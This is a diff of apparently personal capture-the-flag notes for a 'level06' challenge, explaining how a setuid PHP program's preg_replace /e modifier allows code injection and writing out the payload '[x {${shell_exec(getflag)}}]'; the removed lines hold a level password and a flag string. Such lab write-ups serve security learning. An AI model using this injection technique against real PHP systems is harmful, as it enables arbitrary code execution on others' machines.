@@ -1,7 +1,9 @@
-- Connect with login: "level06" and password: "viuaaale9huek52boumoomioc"
+- ls -l <- setuid
+- unreadable code
+	%s/;/;\r/g
+	%s/{/\r{\r/g
 - read level06.php
 	$a = file_get_contents($y); <- a contains string from file y (name specified at first parameter of the program)
-	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); <- /e executes y("a") with a replaced by b in matching pattern [x b] from file y
-- scp -P 4242 exploit level06@192.168.1.?:/tmp
+	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); <- /e executes y(?) as php code with ? replaced by y in matching pattern [x y] from file y
+- echo '[x {${shell_exec(getflag)}}]' > /tmp/exploit
 - ./level06 /tmp/exploit
-	wiok45aaoguiboiki2tuin6ub
